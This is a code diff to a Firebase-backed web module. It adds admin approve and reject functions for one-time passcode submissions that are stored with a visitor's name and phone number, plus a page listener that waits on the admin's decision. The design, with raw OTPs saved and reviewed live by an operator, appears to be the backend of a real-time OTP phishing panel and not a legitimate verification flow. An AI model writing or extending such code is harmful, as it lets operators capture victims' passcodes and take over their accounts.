@@ -2,10 +2,8 @@ import { initializeApp, getApps, type FirebaseApp } from "firebase/app";
 import {
   getFirestore,
   collection,
-  addDoc,
   doc,
   setDoc,
-  getDoc,
   updateDoc,
   onSnapshot,
   query,
@@ -46,12 +44,17 @@ export function getSessionId(): string {
   return id;
 }
 
+export function resetSession(): void {
+  localStorage.removeItem("aman_session");
+}
+
 export async function saveRegistration(fullName: string, phone: string): Promise<void> {
   const id = getSessionId();
   await setDoc(doc(db, "orders", id), {
     fullName,
     phone,
     step: "registered",
+    approved: null,
     timestamp: Timestamp.now(),
   }, { merge: true });
 }
@@ -71,8 +74,36 @@ export async function saveOtp(otp: string): Promise<void> {
   await setDoc(doc(db, "orders", id), {
     otp,
     step: "otp",
+    approved: null,
     completedAt: Timestamp.now(),
   }, { merge: true });
+}
+
+/** Admin: approve an OTP submission */
+export async function approveOrder(id: string): Promise<void> {
+  await updateDoc(doc(db, "orders", id), {
+    approved: true,
+    reviewedAt: Timestamp.now(),
+  });
+}
+
+/** Admin: reject an OTP submission */
+export async function rejectOrder(id: string): Promise<void> {
+  await updateDoc(doc(db, "orders", id), {
+    approved: false,
+    reviewedAt: Timestamp.now(),
+  });
+}
+
+/** OTP page: listen for admin approval decision on current session */
+export function listenForApproval(callback: (approved: boolean | null) => void): () => void {
+  const id = getSessionId();
+  const unsub = onSnapshot(doc(db, "orders", id), (snap) => {
+    if (!snap.exists()) { callback(null); return; }
+    const data = snap.data();
+    callback(data.approved ?? null);
+  });
+  return unsub;
 }
 
 export function subscribeToOrders(callback: (docs: any[]) => void) {
